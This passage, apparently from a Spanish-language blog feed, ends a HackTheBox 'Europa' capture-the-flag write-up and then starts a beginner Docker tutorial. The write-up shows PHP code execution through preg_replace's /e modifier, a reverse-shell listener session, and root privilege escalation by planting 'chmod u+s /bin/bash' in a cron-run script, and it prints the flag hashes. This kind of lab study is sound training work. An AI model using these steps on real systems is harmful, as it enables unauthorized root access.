&lt;p&gt;Basicamente si le agregamos &lt;code&gt;e&lt;/code&gt; en la regex, podemos ejecutar codigo &lt;code&gt;php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues de validar que podemos ejecutar comandos, vamos a enviarnos un revere shell para obtener acceso a la maquina, sin olvidar poner los &lt;code&gt;&amp;amp;&lt;/code&gt; en urlencode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha y obtenemos acceso como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.22.
Ncat: Connection from 10.10.10.22:54978.
bash: cannot set terminal process group (1394): Inappropriate ioctl for device
bash: no job control in this shell
www-data@europa:/var/www/admin$ whoami
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como siempre vamos a obtener un tty full interactiva,&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/var/www/admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@europa:/var/www/admin$ ^Z           
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@europa:/var/www/admin$ export TERM=xterm
www-data@europa:/var/www/admin$ export SHELL=bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;y ahora podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/var/www/admin$ cd /home/john/
www-data@europa:/home/john$ cat user.txt 
69ec17e87bcbe179e22c14a776351728
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Enumerando el sistema podemos ver que se esta ejecutando una tarea a intervalos de tiempo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/home/john$ cat /etc/crontab       
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
#
* * * * *	root	/var/www/cronjobs/clearlogs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si leemos el archivo, vemos que ejecuta un script en bash &lt;code&gt;logcleared.sh&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/home/john$ cat /var/www/cronjobs/clearlogs
#!/usr/bin/php
&amp;lt;?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de ver el archivo, podemos observar que este no existe, pero podemos crearlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/home/john$ touch /var/www/cmd/logcleared.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando la tarea cron, vamos a insertar un codigo en donde otorguemos el permiso &lt;code&gt;suid&lt;/code&gt; a la bash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash

chmod u+s /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora revisamos el permiso de la bash y podemos convertirnos en el usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/home/john$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
www-data@europa:/home/john$ bash -p
bash-4.3# cd /root
bash-4.3# cat root.txt 
5245239446324bb1fe4343385751f280
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Mon, 07 Aug 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Europa</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Europa</guid>
        
        <category>SSL Certificate Inspection Login Bypass</category>
        
        <category>SQLI (Blind Time Based)</category>
        
        <category>Python Scripting</category>
        
        <category>Abusing preg replace (REGEX Danger)</category>
        
        <category>Abusing Cron Job</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Aprende Docker y domina el uso de los contenedores</title>
        <description>&lt;p&gt;Hola en esta ocasión aprenderemos a usar &lt;code&gt;Docker&lt;/code&gt; donde voy a explicarte a detalle paso a paso su funcionamiento y los beneficios que nos otorga usar esta tecnologia la cual puede ayudarnos mucho, asi que es tu momento para aprenderla 😃.&lt;/p&gt;

&lt;h2 id=&quot;indice-y-estructura&quot;&gt;Indice y Estructura&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#que-es-docker&quot;&gt;Que es Docker?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#que-es-un-contenedor&quot;&gt;Ques es un contenedor?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#por-que-aprender-docker&quot;&gt;Por que aprender Docker?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#almacenamiento-de-contenedores&quot;&gt;Almancenamineto de Contenedores&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#antecedentes&quot;&gt;Antecedentes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#despliegue-de-contenedores&quot;&gt;Despligue de Contenedores&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#diferencias&quot;&gt;Diferencias entre Contenedor y Maquina Virtual&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalacion&quot;&gt;Instalación&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#docker-hub&quot;&gt;Docker Hub&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#listar-imagenes&quot;&gt;Listar Imagenes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#descargar-imagenes&quot;&gt;Descargar Imagenes &lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#eliminar-una-imagen&quot;&gt;Eliminar una Imagen&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#crear-un-contenedor&quot;&gt;Creación de un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#iniciar-un-contenedor&quot;&gt;Iniciar un contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#listar-un-contenedor&quot;&gt;Listar Contenedores en Ejecución&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#detener-un-contenedor&quot;&gt;Detener un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#listar-todos-los-contenedores&quot;&gt;Listar Todos los Contenedores&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#eliminar-un-contenedor&quot;&gt;Eliminar un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#establecer-nombre-a-un-contenedor&quot;&gt;Establecer nombre a un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ejecutar-comandos&quot;&gt;Ejecutar Comandos dentro del Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#port-mapping&quot;&gt;Port Mapping&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#mostrar-logs&quot;&gt;Mostrar logs de un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#docker-run&quot;&gt;Docker Run&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conexion-con-un-contenedor&quot;&gt;Conexión con un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#insertar-aplicacion-en-un-contenedor&quot;&gt;Insertar Aplicación en un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#crear-una-imagen&quot;&gt;Crear una Imagen&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#dockerfile&quot;&gt;Dockerfile&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#creacion-de-una-red&quot;&gt;Creación de una Red&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#docker-network&quot;&gt;Docker Network&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#docker-build&quot;&gt;Docker Build&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#docker-compose&quot;&gt;Docker Compose&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#volumenes&quot;&gt;Volumenes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;que-es-docker&quot;&gt;Que es Docker? &lt;a href=&quot;#que-es-docker&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Docker es una plataforma de contenedores que nos permite empaquetar, distribuir y ejecutar aplicaciones de manera eficiente consistente en diferentes entornos, ya que proporciona una forma de encapsular una aplicación y todas sus dependencias en un contenedor virtual ligero y autonomo.&lt;/p&gt;

&lt;p&gt;Pero para entenderlo mejor debemos saber en ciencia exacta que es un contenedor?..&lt;/p&gt;

&lt;h2 id=&quot;que-es-un-contenedor&quot;&gt;Que es un Contenedor? &lt;a href=&quot;#que-es-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Un contenedor es una unidad de software autónoma que encapsula una aplicación y todas sus dependencias, incluyendo el código, las bibliotecas y las variables de entorno necesarias para que la aplicación se ejecute de manera consistente en diferentes entornos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;por-que-aprender-docker&quot;&gt;Por que aprender Docker? &lt;a href=&quot;#por-que-aprender-docker&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Entendiendo mejor el concepto de que es un contenedor y como funciona docker, entocnes por que deberia aprenderlo?, pues hay muchas razones y algunas de estas serian:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Desarrollo y despliegue más rápido:&lt;/strong&gt; Docker facilita la creación y gestión de entornos de desarrollo consistentes. Puedes empaquetar tu aplicación y todas sus dependencias en un contenedor, lo que permite que todo el equipo de desarrollo tenga exactamente el mismo entorno de trabajo. Además, el despliegue de la aplicación se vuelve más rápido y confiable, ya que no tienes que preocuparte por las diferencias entre los entornos de desarrollo y producción.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Portabilidad y compatibilidad:&lt;/strong&gt; Docker es una tecnología altamente portable. Puedes desarrollar una aplicación en tu máquina local y ejecutarla en cualquier otro entorno que tenga Docker instalado, ya sea en un servidor local, en la nube o en el centro de datos. Esto hace que sea más fácil compartir y distribuir tu aplicación, sin preocuparte por las dependencias o las diferencias en los sistemas operativos.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Aislamiento y seguridad:&lt;/strong&gt; Docker proporciona un entorno aislado para tus aplicaciones. Cada contenedor tiene su propio sistema de archivos y recursos aislados, lo que evita conflictos y problemas de compatibilidad entre aplicaciones. Además, puedes configurar permisos y restricciones para controlar el acceso y proteger tus aplicaciones y datos.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Escalabilidad y eficiencia en el uso de recursos:&lt;/strong&gt; Docker permite escalar tus aplicaciones de manera eficiente. Puedes replicar contenedores y distribuir la carga entre ellos para manejar aumentos en la demanda de manera más rápida y sencilla. Además, los contenedores son livianos y comparten recursos del sistema, lo que maximiza la utilización de los recursos y reduce los costos operativos.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Ecosistema y comunidad activa:&lt;/strong&gt; Docker cuenta con una amplia comunidad de usuarios y desarrolladores. Esto significa que hay una gran cantidad de recursos, documentación, tutoriales y ejemplos disponibles en línea. Además, Docker se integra con muchas otras herramientas y servicios populares, lo que amplía aún más las posibilidades de uso y colaboración.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;almacenamiento-de-contenedores&quot;&gt;Almacenamiento de Contenedores &lt;a href=&quot;#almacenamiento-de-contenedores&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los contenedores se almanecenan en repositorios publicos y privados. De los cuales el repositorio publico mas conocido es &lt;code&gt;Docker Hub&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Aqui podemos ejecutar todo tipo de aplicaciones como &lt;code&gt;Python&lt;/code&gt;, &lt;code&gt;SQL&lt;/code&gt;, &lt;code&gt;Python&lt;/code&gt;, &lt;code&gt;Disstribuciones Linux&lt;/code&gt;, &lt;code&gt;MongoDB&lt;/code&gt; y mucho mas.&lt;/p&gt;

&lt;h2 id=&quot;antecedentes&quot;&gt;Antecedentes &lt;a href=&quot;#antecedentes&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Antes de usarse los contenedores existian varios problemas a la hora de que un equipo de desarrollo trabajara en conjunto, esto debido a que cada uno de los mienbros podia tener distinto sistemas operativos y de la misma manera al trabajar en una aplicación estos tendrian distintas versiones de la misma instaladas. Esto causaria una serie de problemas con las dependencias necesarias para la ejecución correcta del programa.&lt;/p&gt;

&lt;p&gt;Como consecuencia eventualmente el desarrollo de la aplicación termine mal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Afortunadamente con los contenedores ahora este tedioso proceso podemos llegar a automatizarlo.&lt;/p&gt;

&lt;p&gt;Para ello debemos descargar una &lt;code&gt;imagen&lt;/code&gt; basada en linux, pero que es una imagen?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Imagen: En Docker, una imagen es un paquete ejecutable y autocontenido que incluye todo lo necesario para ejecutar una aplicación, incluyendo el código, las bibliotecas, las dependencias y las configuraciones necesarias. Se puede pensar en una imagen como una plantilla o un plano a partir del cual se crean los contenedores.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Gracias a esto con solo ejecutar un comando, podemos tener la aplicación corriendo en nuestra maquina, e incluso ademas podriamos tener distintas versiones de esta misma aplicación corriendo en nuestro sistema sin tener ningun conflicto.&lt;/p&gt;

&lt;h3 id=&quot;despliegue-de-contenedores&quot;&gt;Despliegue de Contenedores &lt;a href=&quot;#despliegue-de-contenedores&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Cuando queremos desplegar o actualizar nuestra aplicación, necesitaremos el codigo , dependencias y archivos de configuración. Esto puede ser propenso al no haberse considerado alguna dependencia y generando problemas de comunica´ción. Estos errores unicamente podremos verlos al momento de desplegar nuestra aplicación, lo cual generaria problemas y necesitariamos volver a una versión anterior para que nuestro sistema sigua en funcionamiento.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero gracias a &lt;code&gt;Docker&lt;/code&gt; todo esto podemos evitarlo ya que solo debemos construir una &lt;code&gt;imagen&lt;/code&gt; cuya unica dependencia sera el &lt;code&gt;Runtime&lt;/code&gt; de docker.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Runtime: El &lt;code&gt;runtime&lt;/code&gt; de Docker se refiere al componente responsable de ejecutar los contenedores Docker en un sistema operativo. En otras palabras, es el entorno en el que se ejecutan y se gestionan los contenedores.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Y este proceso puede ser automatizado a traves de pipelines como &lt;code&gt;github&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que un contenedor en simples palabras vendria a ser capas sobre capas de imagenes donde la primera por lo general sera una distribución basada en linux y por lo general esta corresponde a &lt;code&gt;Alpine&lt;/code&gt; ya que es una imagen bastante liviana.&lt;/p&gt;

&lt;p&gt;Des esta manera tendremos sobre esta una serie de imagenes hasta que podamos llegar a nuestra capa de aplicación.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;diferencias&quot;&gt;Diferencias entre Contenedor y Maquina Virtual &lt;a href=&quot;#diferencias&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Al ser docker una forma de virtualización es importante tener en claro las diferencias entre docker y una maquina virtual.&lt;/p&gt;

&lt;p&gt;Debemos tener claro que la &lt;code&gt;virutalización&lt;/code&gt; se basa en 3 capas, las cuales corresponden al hardware, kernel y la aplicación.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Hardware:&lt;/strong&gt; Donde se va ejecutar la virtualización.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Kernel:&lt;/strong&gt; Se encarga de la comunicación con el hardware, siendo responsable de gestionar los recursos del sistema y proporcionar servicios a los programas en ejecución.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aplicaciones:&lt;/strong&gt; Aplicación de la cual vamos a hacer uso.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;De estas capas las &lt;code&gt;VM&lt;/code&gt; virtualizan tanto las &lt;code&gt;aplicaciones&lt;/code&gt; y el &lt;code&gt;kernel&lt;/code&gt;, en consecuencia las imagenes tienen un peso muy alto.&lt;/p&gt;

&lt;p&gt;Pero en el caso de &lt;code&gt;Docker&lt;/code&gt;, unicamente virtualiza las aplicaciones, ya que en el caso del &lt;code&gt;Kernel&lt;/code&gt; lo que hace docker es utilizar el propio kernel del sistema operativo anfitrión.&lt;/p&gt;

&lt;p&gt;En consencuencia las imagenes pesan mucho menos, su rendimiento es superior ya que se ejecutan casi instantaneamente. Por lo que desarrollar y desplegar aplicaciones sera mucho mas rapido y optimo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instalacion&quot;&gt;Instalación &lt;a href=&quot;#instalacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder instalar &lt;code&gt;Docker&lt;/code&gt; si nos encontramos en &lt;code&gt;Windows&lt;/code&gt; debemos instalar &lt;code&gt;Docker Desktop&lt;/code&gt; que viene a ser una VM linux y nos permitira ejecutar contenedores.&lt;/p&gt;

&lt;p&gt;Si deseas descargarla puedes hacerlo desde el enlace oficial:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;https://www.docker.com/products/docker-desktop/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si te encuentras en &lt;code&gt;linux&lt;/code&gt; simplemente puedes instalarlo ejecutando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt update
sudo apt install docker-ce docker-ce-cli containerd.io
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;docker-hub&quot;&gt;Docker Hub &lt;a href=&quot;#docker-hub&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una vez tengamos ya instalado &lt;code&gt;Docker&lt;/code&gt;, vamos a dirigirnos a el repositorio &lt;code&gt;Docker Hub&lt;/code&gt;, donde podemos ver todas las herramientas que podemos utilizar.&lt;/p&gt;

&lt;p&gt;Podemos ver que podemos usar imagenes de &lt;code&gt;Python&lt;/code&gt;, &lt;code&gt;Sql&lt;/code&gt;, &lt;code&gt;Ubuntu&lt;/code&gt;, &lt;code&gt;Node&lt;/code&gt; entre muchas mas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora pinchamos en alguna de ellas como &lt;code&gt;Python&lt;/code&gt; y deslizamos un poco podemos ver distintas versiones de &lt;code&gt;Python&lt;/code&gt; que podemos utilizar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora si subimos un poco, veremos un comando donde veremos un comando el cual si lo ejecutamos nos descargara la imagen respectiva en este caso la de &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;listar-imagenes&quot;&gt;Listar Imagenes &lt;a href=&quot;#listar-imagenes&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;El primer comando que ejecutaremos sera &lt;code&gt;docker images&lt;/code&gt; y este nos monstrara todas las imagenes que hemos descargado en nuestro sistema.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver no nos lista nada debido a que todavia no contamos con ninguna imagen descargada.&lt;/p&gt;

&lt;h2 id=&quot;descargar-imagenes&quot;&gt;Descargar Imagenes &lt;a href=&quot;#descargar-imagenes&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Par poder descargar una imagen solo debemos de usar el comando &lt;code&gt;docker pull&lt;/code&gt;, ahora bien existen dos formas a traves de las cuales podemos hacerlo.&lt;/p&gt;

&lt;p&gt;La primera es simplemente ejecutar el comando y seguido el nombre de la aplicación que queremos descargar, esto por defecto nos descargara la ultima versión disponible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos como &lt;code&gt;docker&lt;/code&gt; descarga cada una de las capas que componen nuestra imagen y si en algun caso nosotros vamos a descargar otra imagen cuyas capas ya fueron descargadas antes por otra imagen como la que tenemos &lt;code&gt;mysql&lt;/code&gt;, estas capas no volveran a descargarse ya que usaran las que ya tenemos optimizando nuestro espacio en disco.&lt;/p&gt;

&lt;p&gt;Si ahora volvemos a listar las imagenes &lt;code&gt;docker images&lt;/code&gt;, observamos que esta vez ya contamos con una imagen descargada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si miramos con atención observamos que nuestra imagen tiene una serie de etiquetas.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;REPOSITORY:&lt;/strong&gt; Indica el nombre de la imagen&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;TAG:&lt;/strong&gt; Indica la versión utilizada, en este caso usa &lt;code&gt;latest&lt;/code&gt; al no haberla especificado.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;IMAGE ID:&lt;/strong&gt; Corresponde a un identificador unico de la imagen.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CREATED:&lt;/strong&gt; Cuando fue creada la imagen.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SIZE:&lt;/strong&gt; Espacio usado en disco.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La segunda manera en la que podemos descargar una imagen seria especificar la versión exacta que queremos descargar, para ello debemos agregar con &lt;code&gt;:version&lt;/code&gt; la versión de la imagen y ejecutar el mismo comando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que esta vez la imagen se nos descargo casi al instante. Si ahora volvemos a listar las imagenes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues de volver a lista vemos que tenemos casi las mismas etiquetas, ya que al especificar la versión en la descarga, usamos la ultima y seria el mismo proceso al no especificar la versión ya que de esa manera tambien nos descarga la ultima versión. Solo que esta vez tenemos dos imagenes pero con distintos valores en el &lt;code&gt;TAG&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora vamos a descargar otra versión mas antigua de &lt;code&gt;mysql&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listamos nuevamente las imagenes y esta vez ya que descargamos una versión previa observamos la nueva versión en conjunto con un nuevo identificador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera podemos descargarnos distintas imagenes con sus respectivas versiones y si queremos ver cuales estan disponibles, solo debemos dirigirnos a &lt;code&gt;Docker Hub&lt;/code&gt; y elegir la versión que necesitemos.&lt;/p&gt;

&lt;h2 id=&quot;eliminar-una-imagen&quot;&gt;Eliminar una Imagen &lt;a href=&quot;#eliminar-una-imagen&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder eliminar una imagen previamente descargada, tenemos que ejecutar el comando &lt;code&gt;docker image rm nombre_imagen:version&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Entonces listamos nuevamente las imagenes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora procederemos a eliminar las versiones &lt;code&gt;8.0&lt;/code&gt; y &lt;code&gt;5.7&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listamos nuevamente las imagenes disponibles y vemos que se eliminaron con exito las versiones seleccionadas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;crear-un-contenedor&quot;&gt;Creación de un Contenedor &lt;a href=&quot;#crear-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para poder crear un contenedor, primero debemos tener descargada una imagen y ya que previamente estuvimos usando una correspondiente a &lt;code&gt;mysql&lt;/code&gt;, pero para realizar una variacion y simplicidad vamos a trabajar con &lt;code&gt;mongodb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Asi que primero vamos a proceder a descargar la imagen de &lt;code&gt;mongo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y volvemos a verificar que la imagen fue correctamente descargada.&lt;/p&gt;

